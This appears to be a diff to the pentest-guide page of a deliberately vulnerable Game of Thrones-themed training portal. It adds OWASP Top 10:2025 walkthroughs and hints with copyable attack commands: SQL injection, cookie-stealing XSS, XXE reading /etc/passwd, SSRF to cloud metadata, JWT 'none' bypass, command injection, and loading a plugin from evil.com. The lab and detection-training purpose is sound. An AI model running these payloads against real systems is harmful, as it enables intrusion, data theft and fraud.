@@ -917,44 +917,246 @@ and hidden information that can be used for exploitation.</pre>
   <div class="page">
     <div class="page-header">
       <h1 class="page-title">Pentest Guide</h1>
-      <p class="page-subtitle">Attack surface map, methodology, and hints for the Seven Kingdoms Portal.</p>
+      <p class="page-subtitle">OWASP Top 10:2025 coverage, shop exploitation walkthroughs, attack surface map, and hints.</p>
+    </div>
+
+    <!-- OWASP 2025 Coverage -->
+    <div class="guide-section">
+      <div class="guide-header" onclick="toggleGuide(this)">
+        <h3>&#127919; OWASP Top 10:2025 Coverage</h3>
+        <span class="chevron">&#9654;</span>
+      </div>
+      <div class="guide-body">
+        <p style="color:var(--text-secondary);font-size:0.85rem;margin-bottom:16px;">This portal covers all 10 categories from the <strong>OWASP Top 10:2025</strong> standard. Each vulnerability generates OpenTelemetry traces for detection rule development.</p>
+        <table class="surface-table">
+          <thead>
+            <tr><th>OWASP 2025</th><th>Category</th><th>Shop Endpoints</th><th>Status</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><strong>A01</strong></td><td>Broken Access Control</td><td>IDOR on items/cart/wallet/orders, CSRF allegiance, path traversal</td><td><span class="badge badge-ctf">10 vulns</span></td></tr>
+            <tr><td><strong>A02</strong></td><td>Security Misconfiguration</td><td>XXE trade import, CAPTCHA leak, debug endpoints, verbose errors</td><td><span class="badge badge-ctf">4 vulns</span></td></tr>
+            <tr><td><strong>A03</strong></td><td>Supply Chain Failures</td><td><code>/api/shop/payment-plugin</code> (untrusted code), <code>/api/shop/dependencies</code> (CVE leak)</td><td><span class="badge badge-ctf">2 vulns</span></td></tr>
+            <tr><td><strong>A04</strong></td><td>Cryptographic Failures</td><td>MD5 passwords, weak coupon encoding (base64), PCI CC logging, JWT secret</td><td><span class="badge badge-ctf">5 vulns</span></td></tr>
+            <tr><td><strong>A05</strong></td><td>Injection</td><td>SQLi (shop search/orders), LDAP, command, SSTI, stored XSS (reviews)</td><td><span class="badge badge-ctf">8 vulns</span></td></tr>
+            <tr><td><strong>A06</strong></td><td>Insecure Design</td><td>Mass assignment, negative transfer, price manipulation, expired coupons</td><td><span class="badge badge-ctf">6 vulns</span></td></tr>
+            <tr><td><strong>A07</strong></td><td>Authentication Failures</td><td>Default creds, brute force, JWT none bypass, session fixation, OSINT questions</td><td><span class="badge badge-ctf">5 vulns</span></td></tr>
+            <tr><td><strong>A08</strong></td><td>Integrity Failures</td><td>Pickle deserialization, prototype pollution, unsigned plugin loading</td><td><span class="badge badge-ctf">3 vulns</span></td></tr>
+            <tr><td><strong>A09</strong></td><td>Logging &amp; Alerting Failures</td><td>Silent transfer (no audit), CC data in logs, log injection</td><td><span class="badge badge-ctf">3 vulns</span></td></tr>
+            <tr><td><strong>A10</strong></td><td>Exceptional Conditions</td><td><code>/api/shop/items/{id}/debug</code> (stack trace leak), <code>/api/shop/bulk-purchase</code> (zero-div)</td><td><span class="badge badge-ctf">2 vulns</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Shop Exploitation Walkthroughs -->
+    <div class="guide-section">
+      <div class="guide-header" onclick="toggleGuide(this)">
+        <h3>&#128722; Shop Exploitation Walkthroughs</h3>
+        <span class="chevron">&#9654;</span>
+      </div>
+      <div class="guide-body">
+
+        <div class="guide-step">
+          <div class="guide-step-num">1</div>
+          <div class="guide-step-content">
+            <h4>SQL Injection in Shop Search (A05)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/shop/items?search=</code></p>
+            <p>1. Go to the Shop tab and type <code>' OR '1'='1</code> in the search box.<br>
+               2. All items (including hidden/deleted ones) should appear.<br>
+               3. Try UNION-based extraction: <code>' UNION SELECT id,buyer,item_name,quantity,total_price,order_date,status,1 FROM shop_orders--</code><br>
+               4. Check the API Response Inspector (bottom-right) for raw JSON with FLAG.</p>
+            <div class="guide-cmd">curl -s "http://TARGET/portal/api/shop/items?search=' OR '1'='1"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="guide-step">
+          <div class="guide-step-num">2</div>
+          <div class="guide-step-content">
+            <h4>IDOR — View Secret Items (A01)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/shop/items/{id}</code></p>
+            <p>1. Items 9 and 12 contain hidden FLAG values in their descriptions.<br>
+               2. Directly request <code>/portal/api/shop/items/9</code> — the Braavosi Galeas has a secret.<br>
+               3. Try item IDs 100 and 101 for "deleted" products (like Juice Shop's Christmas Special).<br>
+               4. Also try <code>/portal/api/wallet/balance?username=admin</code> to see the admin's gold.</p>
+            <div class="guide-cmd">curl -s "http://TARGET/portal/api/shop/items/9" | python3 -m json.tool<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="guide-step">
+          <div class="guide-step-num">3</div>
+          <div class="guide-step-content">
+            <h4>Price Manipulation (A06)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/shop/purchase</code></p>
+            <p>1. Add expensive items to your cart (e.g. Faceless Men Assassination at 500,000 gold).<br>
+               2. Intercept the purchase request and change the <code>total</code> field to <code>1</code>.<br>
+               3. The server logs the discrepancy but still processes the order.</p>
+            <div class="guide-cmd">curl -s -X POST http://TARGET/portal/api/shop/purchase \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"guest","items":[{"item_id":24,"quantity":1}],"total":1}'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="guide-step">
+          <div class="guide-step-num">4</div>
+          <div class="guide-step-content">
+            <h4>Stored XSS via Product Reviews (A05)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/shop/reviews/{item_id}</code></p>
+            <p>1. Open any product detail and scroll to "Write a Review".<br>
+               2. In the Comment field, enter: <code>&lt;img src=x onerror="alert('XSS')"&gt;</code><br>
+               3. Submit the review. The comment is stored unsanitized.<br>
+               4. Also try forging identity: set Author to <code>daenerys.targaryen</code> without being logged in.</p>
+            <div class="guide-cmd">curl -s -X POST http://TARGET/portal/api/shop/reviews/1 \
+  -H 'Content-Type: application/json' \
+  -d '{"author":"daenerys.targaryen","rating":1,"comment":"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"}'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="guide-step">
+          <div class="guide-step-num">5</div>
+          <div class="guide-step-content">
+            <h4>Coupon Forgery — Weak Encoding (A04)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/shop/coupon/apply</code></p>
+            <p>1. Try known coupons: <code>DRAGON10</code> (10%), <code>VALAR50</code> (50%, expired but still works!).<br>
+               2. Visit <code>/portal/api/shop/coupons/encode-sample</code> to see encoding scheme.<br>
+               3. The format is base64 of <code>SKPCOUPON|CODE|PERCENT|EXPIRY</code>.<br>
+               4. Forge a 99% coupon: <code>echo -n 'SKPCOUPON|HACKED|99|2099-12-31' | base64</code><br>
+               5. Apply the forged code to get near-free purchases.</p>
+            <div class="guide-cmd"># Generate forged 99% coupon
+echo -n 'SKPCOUPON|HACKED|99|2099-12-31' | base64
+# Apply it
+curl -s -X POST http://TARGET/portal/api/shop/coupon/apply \
+  -H 'Content-Type: application/json' \
+  -d '{"code":"U0tQQ09VUE9OfEhBQ0tFRHw5OXwyMDk5LTEyLTMx"}'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="guide-step">
+          <div class="guide-step-num">6</div>
+          <div class="guide-step-content">
+            <h4>Gold Wallet — Negative Transfer (A06)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/wallet/transfer</code></p>
+            <p>1. Check admin's wallet: <code>/portal/api/wallet/balance?username=admin</code> (IDOR).<br>
+               2. Transfer a negative amount: <code>{"from":"admin","to":"guest","amount":-100000}</code><br>
+               3. The negative reverses the direction — you steal admin's gold!<br>
+               4. Also try race conditions: send 10 simultaneous transfers of the same amount.</p>
+            <div class="guide-cmd">curl -s -X POST http://TARGET/portal/api/wallet/transfer \
+  -H 'Content-Type: application/json' \
+  -d '{"from":"admin","to":"guest","amount":-100000}'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="guide-step">
+          <div class="guide-step-num">7</div>
+          <div class="guide-step-content">
+            <h4>XXE — Trade Import (A02)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/trade/import</code></p>
+            <p>1. Craft an XML payload with an external entity referencing <code>/etc/passwd</code>.<br>
+               2. The parser resolves entities — file contents appear in the response.<br>
+               3. Also try SSRF via <code>SYSTEM "http://169.254.169.254/"</code> for cloud metadata.</p>
+            <div class="guide-cmd">curl -s -X POST http://TARGET/portal/api/trade/import \
+  -H 'Content-Type: application/xml' \
+  -d '&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE trade [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;trade&gt;&lt;from&gt;&amp;xxe;&lt;/from&gt;&lt;to&gt;guest&lt;/to&gt;&lt;item&gt;gold&lt;/item&gt;&lt;/trade&gt;'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="guide-step">
+          <div class="guide-step-num">8</div>
+          <div class="guide-step-content">
+            <h4>Supply Chain — Malicious Plugin (A03:2025)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/shop/payment-plugin</code></p>
+            <p>1. The shop allows loading "payment gateway plugins" from any URL.<br>
+               2. No signature verification, no allow-list, no hash pinning.<br>
+               3. POST a URL to a malicious script — the server fetches and would execute it.<br>
+               4. Also check <code>/portal/api/shop/dependencies</code> to enumerate CVEs in pinned versions.</p>
+            <div class="guide-cmd"># Load malicious plugin (simulated)
+curl -s -X POST http://TARGET/portal/api/shop/payment-plugin \
+  -H 'Content-Type: application/json' \
+  -d '{"plugin_url":"https://evil.com/malicious-gateway.py","plugin_name":"evil-pay"}'
+# Enumerate vulnerable dependencies
+curl -s http://TARGET/portal/api/shop/dependencies | python3 -m json.tool<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="guide-step">
+          <div class="guide-step-num">9</div>
+          <div class="guide-step-content">
+            <h4>Verbose Error Disclosure (A10:2025)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/shop/items/{id}/debug</code></p>
+            <p>1. Request a non-existent item: <code>/portal/api/shop/items/99999/debug</code><br>
+               2. The error response leaks stack traces, DB credentials, JWT secret hints, and server paths.<br>
+               3. Also try <code>/portal/api/shop/bulk-purchase</code> with <code>quantity: 0</code> — triggers ZeroDivisionError with internal details.</p>
+            <div class="guide-cmd"># Trigger verbose error disclosure
+curl -s http://TARGET/portal/api/shop/items/99999/debug | python3 -m json.tool
+# Trigger zero-division exception
+curl -s -X POST http://TARGET/portal/api/shop/bulk-purchase \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"guest","items":[{"item_id":1,"quantity":0}]}'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="guide-step">
+          <div class="guide-step-num">10</div>
+          <div class="guide-step-content">
+            <h4>Checkout PCI Violation (A04 + A09)</h4>
+            <p><strong>Target:</strong> <code>/portal/api/shop/checkout</code></p>
+            <p>1. Add items to cart and proceed to checkout with a credit card.<br>
+               2. The full CC number, CVV, and cardholder name are logged in OpenTelemetry spans.<br>
+               3. This violates PCI-DSS — card data must never be stored or logged in plaintext.<br>
+               4. Check APM Traces tab to see the <code>payment.card_full</code> attribute in spans.</p>
+            <div class="guide-cmd">curl -s -X POST http://TARGET/portal/api/shop/checkout \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"guest","cc_number":"4111111111111111","cc_expiry":"12/28","cc_cvv":"123","cc_name":"Jon Snow","total":100}'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+      </div>
     </div>
 
     <!-- Attack Surface Table -->
     <div class="guide-section">
       <div class="guide-header" onclick="toggleGuide(this)">
-        <h3>&#128506; Attack Surface Map</h3>
+        <h3>&#128506; Full Attack Surface Map</h3>
         <span class="chevron">&#9654;</span>
       </div>
       <div class="guide-body">
         <table class="surface-table">
           <thead>
-            <tr><th>Endpoint</th><th>Method</th><th>Vulnerability</th><th>OWASP</th><th>MITRE</th><th>Severity</th></tr>
+            <tr><th>Endpoint</th><th>Method</th><th>Vulnerability</th><th>OWASP 2025</th><th>MITRE</th><th>Severity</th></tr>
           </thead>
           <tbody>
             <tr><td><code>/portal/api/auth/login</code></td><td>POST</td><td>Default Credentials, Brute Force</td><td>A07</td><td>T1078, T1110</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/auth/register</code></td><td>POST</td><td>Mass Assignment</td><td>A04</td><td>T1098</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/auth/register</code></td><td>POST</td><td>Mass Assignment (admin role)</td><td>A06</td><td>T1098</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/auth/security-question</code></td><td>GET</td><td>OSINT-Exploitable Answers</td><td>A07</td><td>T1589</td><td><span class="badge badge-medium">Medium</span></td></tr>
             <tr><td><code>/portal/api/users/{id}</code></td><td>GET</td><td>IDOR</td><td>A01</td><td>T1078</td><td><span class="badge badge-high">High</span></td></tr>
-            <tr><td><code>/portal/api/ldap/lookup</code></td><td>GET</td><td>LDAP Injection</td><td>A03</td><td>T1190</td><td><span class="badge badge-high">High</span></td></tr>
-            <tr><td><code>/portal/api/treasury/search</code></td><td>GET</td><td>SQL Injection</td><td>A03</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/messages/send</code></td><td>POST</td><td>Stored XSS</td><td>A03</td><td>T1059.007</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/ldap/lookup</code></td><td>GET</td><td>LDAP Injection</td><td>A05</td><td>T1190</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/treasury/search</code></td><td>GET</td><td>SQL Injection</td><td>A05</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/messages/send</code></td><td>POST</td><td>Stored XSS</td><td>A05</td><td>T1059.007</td><td><span class="badge badge-high">High</span></td></tr>
             <tr><td><code>/portal/api/files/download</code></td><td>GET</td><td>Path Traversal / LFI</td><td>A01</td><td>T1005</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/template/render</code></td><td>POST</td><td>SSTI</td><td>A03</td><td>T1059</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/command/exec</code></td><td>POST</td><td>Command Injection / RCE</td><td>A03</td><td>T1059</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/avatar/fetch</code></td><td>GET</td><td>SSRF</td><td>A10</td><td>T1090</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/webhook/send</code></td><td>POST</td><td>SSRF</td><td>A10</td><td>T1090</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/template/render</code></td><td>POST</td><td>SSTI</td><td>A05</td><td>T1059</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/command/exec</code></td><td>POST</td><td>Command Injection / RCE</td><td>A05</td><td>T1059</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/avatar/fetch</code></td><td>GET</td><td>SSRF</td><td>A05</td><td>T1090</td><td><span class="badge badge-critical">Critical</span></td></tr>
             <tr><td><code>/portal/api/admin/panel</code></td><td>GET</td><td>JWT None Algorithm Bypass</td><td>A07</td><td>T1134</td><td><span class="badge badge-critical">Critical</span></td></tr>
             <tr><td><code>/portal/api/debug/crypto</code></td><td>GET</td><td>Credential Leak</td><td>A02</td><td>T1552</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/import/profile</code></td><td>GET</td><td>Insecure Deserialization</td><td>A08</td><td>T1059</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/redirect</code></td><td>GET</td><td>Open Redirect</td><td>A01</td><td>T1566.002</td><td><span class="badge badge-medium">Medium</span></td></tr>
+            <tr><td><code>/portal/api/import/profile</code></td><td>POST</td><td>Insecure Deserialization</td><td>A08</td><td>T1059</td><td><span class="badge badge-critical">Critical</span></td></tr>
             <tr><td><code>/portal/api/log</code></td><td>POST</td><td>Log Injection</td><td>A09</td><td>T1070</td><td><span class="badge badge-medium">Medium</span></td></tr>
-            <tr><td><code>/api/v1/got/wildlings</code></td><td>GET</td><td>SQL Injection (GOAD MSSQL)</td><td>A03</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/api/v1/got/dragons</code></td><td>GET</td><td>SSRF (GOAD Network)</td><td>A10</td><td>T1090</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/shop/items</code></td><td>GET</td><td>SQLi in Search (MSSQL)</td><td>A03</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/shop/items/{id}</code></td><td>GET</td><td>IDOR (Secret Items)</td><td>A01</td><td>T1078</td><td><span class="badge badge-high">High</span></td></tr>
-            <tr><td><code>/portal/api/shop/purchase</code></td><td>POST</td><td>Price Manipulation</td><td>A04</td><td>T1565</td><td><span class="badge badge-critical">Critical</span></td></tr>
-            <tr><td><code>/portal/api/shop/orders</code></td><td>GET</td><td>SQLi + IDOR (MSSQL)</td><td>A03</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr style="background:rgba(201,168,76,0.05);"><td colspan="6" style="color:var(--gold);font-weight:700;padding:8px 10px;">Shop-Specific Vulnerabilities</td></tr>
+            <tr><td><code>/portal/api/shop/items?search=</code></td><td>GET</td><td>SQLi in Search (MSSQL)</td><td>A05</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/shop/items/{id}</code></td><td>GET</td><td>IDOR (Secret Items 9, 12)</td><td>A01</td><td>T1078</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/shop/purchase</code></td><td>POST</td><td>Price Manipulation</td><td>A06</td><td>T1565</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/shop/checkout</code></td><td>POST</td><td>PCI Violation (CC in logs)</td><td>A04+A09</td><td>T1552</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/shop/orders</code></td><td>GET</td><td>SQLi + IDOR (MSSQL)</td><td>A05+A01</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
             <tr><td><code>/portal/api/shop/cart</code></td><td>GET</td><td>Cart IDOR</td><td>A01</td><td>T1078</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/shop/reviews/{id}</code></td><td>POST</td><td>Stored XSS + Forged Identity</td><td>A05+A01</td><td>T1059.007</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/shop/coupon/apply</code></td><td>POST</td><td>Coupon Forgery (Base64)</td><td>A04</td><td>T1565</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/wallet/balance</code></td><td>GET</td><td>IDOR (Any User's Balance)</td><td>A01</td><td>T1078</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/wallet/transfer</code></td><td>POST</td><td>Negative Transfer, Race Condition</td><td>A06</td><td>T1565</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/trade/import</code></td><td>POST</td><td>XXE (XML External Entities)</td><td>A02</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/users/change-allegiance</code></td><td>POST</td><td>CSRF (No Token)</td><td>A01</td><td>T1098</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/shop/payment-plugin</code></td><td>POST</td><td>Supply Chain RCE</td><td>A03</td><td>T1195</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/shop/dependencies</code></td><td>GET</td><td>Dependency Enumeration</td><td>A03</td><td>T1592</td><td><span class="badge badge-medium">Medium</span></td></tr>
+            <tr><td><code>/portal/api/shop/items/{id}/debug</code></td><td>GET</td><td>Verbose Error / Stack Trace Leak</td><td>A10</td><td>T1082</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/shop/bulk-purchase</code></td><td>POST</td><td>Zero-Division, Integer Overflow</td><td>A10</td><td>T1499</td><td><span class="badge badge-high">High</span></td></tr>
           </tbody>
         </table>
       </div>
@@ -971,55 +1173,55 @@ and hidden information that can be used for exploitation.</pre>
           <div class="guide-step-num">1</div>
           <div class="guide-step-content">
             <h4>Reconnaissance</h4>
-            <p>Explore the application. Check <code>/portal/api/debug/env</code> and <code>/portal/api/debug/crypto</code> for information leaks. Test the <code>/portal/api/goad/connectivity</code> endpoint to understand the network topology.</p>
+            <p>Explore the application. Check <code>/portal/api/debug/env</code> and <code>/portal/api/debug/crypto</code> for information leaks. Hit <code>/portal/api/shop/dependencies</code> to enumerate vulnerable packages. Test <code>/portal/api/goad/connectivity</code> to understand the network topology.</p>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-num">2</div>
           <div class="guide-step-content">
             <h4>Authentication Attacks</h4>
-            <p>Try default credentials against the login form. Attempt brute force with common passwords. Examine the JWT token structure after login — the secret may be weak.</p>
+            <p>Try default credentials (<code>admin/admin</code>). Brute force with common passwords. Examine the JWT structure — the secret may be weak. Try the "none" algorithm bypass on <code>/portal/api/admin/panel</code>. Check security questions at <code>/portal/api/auth/security-question?username=jon.snow</code> for OSINT-guessable answers.</p>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-num">3</div>
           <div class="guide-step-content">
             <h4>Injection Testing</h4>
-            <p>Test every input field for injection vulnerabilities: SQL injection in Treasury search, LDAP injection in user lookup, command injection in System Console, SSTI in Template Renderer.</p>
+            <p>Test every input: SQL injection in Treasury search and Shop search, LDAP injection in user lookup, command injection in System Console, SSTI in Template Renderer, stored XSS in product reviews, XXE in trade import.</p>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-num">4</div>
           <div class="guide-step-content">
-            <h4>Access Control</h4>
-            <p>Test IDOR by changing user IDs in the User Directory. Try path traversal in File Manager. Attempt to access the Admin Panel by forging JWT tokens.</p>
+            <h4>Access Control &amp; Business Logic</h4>
+            <p>Test IDOR by changing user IDs, item IDs, and usernames in cart/wallet/orders. Try path traversal. Exploit price manipulation and negative wallet transfers. Forge coupons using the base64 encoding scheme.</p>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-num">5</div>
           <div class="guide-step-content">
-            <h4>Server-Side Attacks</h4>
-            <p>Use Network Tools to test SSRF against internal services (GOAD VMs at 192.168.56.x, OCI metadata at 169.254.169.254). Test deserialization via Data Import.</p>
+            <h4>Server-Side &amp; Supply Chain</h4>
+            <p>Use SSRF to reach cloud metadata (169.254.169.254) and GOAD VMs (192.168.56.x). Load a malicious payment plugin via <code>/portal/api/shop/payment-plugin</code>. Test deserialization via Data Import.</p>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-num">6</div>
           <div class="guide-step-content">
-            <h4>GOAD Integration</h4>
-            <p>If GOAD Active Directory is reachable, test SQL injection against the Castle Black MSSQL database. Try LDAP authentication against the three domain controllers. Explore the dragon egg tracker for SSRF against the GOAD network.</p>
+            <h4>Error Exploitation</h4>
+            <p>Trigger verbose errors via <code>/portal/api/shop/items/99999/debug</code> to leak DB credentials and JWT secrets. Send <code>quantity: 0</code> to <code>/portal/api/shop/bulk-purchase</code> to trigger ZeroDivisionError with internal state disclosure.</p>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-num">7</div>
           <div class="guide-step-content">
-            <h4>Marketplace Exploitation</h4>
-            <p>The Seven Kingdoms Marketplace connects to GOAD MSSQL. Browse items, search with SQL injection payloads, view secret items via IDOR (items 9, 12). Try price manipulation: add items to cart, then submit a purchase with a fake <code>total</code>. Check order history with <code>' OR 1=1--</code> to dump all orders from the MSSQL database.</p>
+            <h4>GOAD Integration</h4>
+            <p>If GOAD Active Directory is reachable, test SQL injection against Castle Black MSSQL. Try LDAP auth against the three domain controllers. The shop search and order history endpoints connect to GOAD MSSQL for real database exploitation.</p>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- Hints (Progressive Disclosure) -->
+    <!-- Hints -->
     <div class="guide-section">
       <div class="guide-header" onclick="toggleGuide(this)">
         <h3>&#128161; Vulnerability Hints</h3>
@@ -1029,19 +1231,31 @@ and hidden information that can be used for exploitation.</pre>
         <div class="hints-grid">
           <div class="hint-card" onclick="revealHint(this)">
             <h4>Authentication Bypass</h4>
-            <div class="hint-hidden">Try <code>admin</code> / <code>admin</code>. Also: the JWT secret is very short.</div>
+            <div class="hint-hidden">Try <code>admin</code> / <code>admin</code>. Also: the JWT secret is very short. Security questions have GoT-trivia answers (e.g. <code>ghost</code>, <code>drogon</code>).</div>
           </div>
           <div class="hint-card" onclick="revealHint(this)">
             <h4>SQL Injection</h4>
-            <div class="hint-hidden">Treasury search: <code>' OR 1=1--</code><br>Wildlings: <code>Tormund' UNION SELECT name,1,1 FROM sysobjects--</code><br>Shop search: <code>' UNION SELECT * FROM shop_orders--</code></div>
+            <div class="hint-hidden">Treasury search: <code>' OR 1=1--</code><br>Shop search: <code>' UNION SELECT * FROM shop_orders--</code><br>Order history: username = <code>' OR 1=1--</code></div>
           </div>
           <div class="hint-card" onclick="revealHint(this)">
-            <h4>Marketplace Exploits</h4>
-            <div class="hint-hidden">IDOR: View items 9 and 12 for hidden flags.<br>Price manipulation: POST purchase with <code>{"username":"you","total":1}</code>.<br>Orders SQLi: <code>' OR 1=1--</code> to dump all orders.</div>
+            <h4>Shop — Price &amp; Coupons</h4>
+            <div class="hint-hidden">Purchase with <code>{"total":1}</code> to override price.<br>Forge coupon: <code>echo -n 'SKPCOUPON|HACK|99|2099-12-31' | base64</code><br>Expired <code>VALAR50</code> still works!</div>
           </div>
           <div class="hint-card" onclick="revealHint(this)">
-            <h4>IDOR</h4>
-            <div class="hint-hidden">Try user IDs 1-10. Admin is usually ID 1. Compare responses for different IDs.</div>
+            <h4>Shop — IDOR &amp; Wallet</h4>
+            <div class="hint-hidden">Items 9, 12 have flags. Try IDs 100-101 for deleted items.<br>Wallet: <code>?username=admin</code> shows 999,999 gold.<br>Negative transfer: <code>amount: -100000</code> steals gold.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>Supply Chain (A03:2025)</h4>
+            <div class="hint-hidden">POST to <code>/api/shop/payment-plugin</code> with any URL — no integrity check.<br><code>/api/shop/dependencies</code> leaks all package versions + known CVEs.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>Error Disclosure (A10:2025)</h4>
+            <div class="hint-hidden"><code>/api/shop/items/99999/debug</code> leaks stack trace, DB creds, JWT secret.<br>Bulk purchase with <code>quantity: 0</code> causes ZeroDivisionError with internals.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>XSS &amp; Reviews</h4>
+            <div class="hint-hidden">Reviews: <code>&lt;img src=x onerror=alert(1)&gt;</code><br>Messages: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>Author field accepts any name — impersonate anyone.</div>
           </div>
           <div class="hint-card" onclick="revealHint(this)">
             <h4>Path Traversal</h4>
@@ -1052,28 +1266,12 @@ and hidden information that can be used for exploitation.</pre>
             <div class="hint-hidden">System Console: <code>hostname; whoami</code> or <code>hostname | cat /etc/passwd</code></div>
           </div>
           <div class="hint-card" onclick="revealHint(this)">
-            <h4>SSRF</h4>
-            <div class="hint-hidden">Avatar Fetch: try <code>http://169.254.169.254/latest/meta-data/</code> or <code>http://192.168.56.10:389</code></div>
+            <h4>SSRF &amp; XXE</h4>
+            <div class="hint-hidden">Avatar: <code>http://169.254.169.254/latest/meta-data/</code><br>XXE: <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code> in trade import.</div>
           </div>
           <div class="hint-card" onclick="revealHint(this)">
-            <h4>SSTI</h4>
-            <div class="hint-hidden">Template Renderer: <code>{{7*7}}</code> should return <code>49</code>. Try <code>{{config}}</code> for info leak.</div>
-          </div>
-          <div class="hint-card" onclick="revealHint(this)">
-            <h4>JWT Bypass</h4>
-            <div class="hint-hidden">Login first, then decode your JWT. Change <code>alg</code> to <code>none</code> and <code>role</code> to <code>admin</code>. Remove the signature.</div>
-          </div>
-          <div class="hint-card" onclick="revealHint(this)">
-            <h4>LDAP Injection</h4>
-            <div class="hint-hidden">LDAP Lookup: try <code>*</code> to dump all users, or <code>admin)(|(password=*</code> for filter injection.</div>
-          </div>
-          <div class="hint-card" onclick="revealHint(this)">
-            <h4>Mass Assignment</h4>
-            <div class="hint-hidden">Registration: add <code>"role": "admin"</code> to the JSON body. The server doesn't filter extra fields.</div>
-          </div>
-          <div class="hint-card" onclick="revealHint(this)">
-            <h4>XSS</h4>
-            <div class="hint-hidden">Messages: send <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code></div>
+            <h4>JWT &amp; CSRF</h4>
+            <div class="hint-hidden">JWT: change <code>alg</code> to <code>none</code>, set <code>role: admin</code>, remove signature.<br>CSRF: <code>/api/users/change-allegiance</code> has no token check.</div>
           </div>
           <div class="hint-card" onclick="revealHint(this)">
             <h4>Deserialization</h4>
